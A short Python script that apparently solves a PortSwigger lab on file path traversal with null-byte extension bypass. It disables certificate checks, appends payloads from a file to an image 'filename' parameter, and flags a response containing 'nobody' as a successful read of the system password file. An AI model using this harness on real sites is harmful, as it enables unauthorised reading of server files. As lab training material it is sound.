from requests import Session
from os import path
from urllib3 import disable_warnings, exceptions


def lab(url):
    session = Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"})
    session.verify = False
    session.stream = False

    found = False
    with open(path.join(path.dirname(__file__), 'payloads.txt')) as payloads:
        for payload in payloads:

            if found:
                found = False
                break

            response = session.get(url=f'{url}{payload.strip()}', allow_redirects=False)

            if 'nobody' in response.text:
                print(f'PAYLOAD {url}{payload.strip()}')
                found = True


# File path traversal, validation of file extension with null byte bypass
# https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass
if __name__ == '__main__':
    disable_warnings(exceptions.InsecureRequestWarning)

    lab(
        'https://0a76008e040276c181fda2c8005f00ef.web-security-academy.net/image?filename='
    )
